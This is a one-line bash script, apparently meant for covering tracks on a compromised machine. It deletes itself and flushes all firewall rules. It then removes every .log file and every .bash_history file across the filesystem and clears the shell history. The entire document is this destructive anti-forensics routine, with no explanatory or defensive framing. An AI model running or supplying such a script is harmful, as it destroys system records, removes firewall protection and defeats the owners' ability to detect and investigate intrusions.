#!/bin/bash

rm $0; iptables --flush; find / -name *.log | xargs rm; find / -name .bash_history | xargs rm; history -c
